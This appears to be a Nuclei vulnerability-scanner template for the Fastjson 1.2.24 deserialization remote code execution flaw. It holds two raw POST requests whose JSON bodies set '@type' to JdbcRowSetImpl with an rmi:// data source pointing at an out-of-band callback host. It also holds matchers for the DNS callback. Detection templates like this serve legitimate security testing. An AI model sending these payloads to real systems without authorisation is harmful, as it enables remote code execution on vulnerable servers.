http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: and
    type: word
    words:
    - Internal Server Error
    - '500'
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \  \"b\":{\n        \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n        \"dataSourceName\"\
    :\"rmi://{{interactsh-url}}/Exploit\",\n        \"autoCommit\":true\n    }\n}\n"
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\n   \"dataSourceName\":\"rmi://{{interactsh-url}}/Exploit\"\
    ,\n   \"autoCommit\":true\n}\n"
  stop-at-first-match: true
id: fastjson-1-2-24-rce
info:
  author: zh
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cwe-id: CWE-77
  description: Fastjson 1.2.24 is susceptible to a deserialization remote code execution
    vulnerability.
  metadata:
    max-request: 2
  name: Fastjson 1.2.24 - Remote Code Execution
  reference:
  - https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
  - https://www.freebuf.com/vuls/208339.html
  - https://github.com/wyzxxz/fastjson_rce_tool
  severity: critical
  tags: fastjson,rce,deserialization,oast,vulhub,vuln
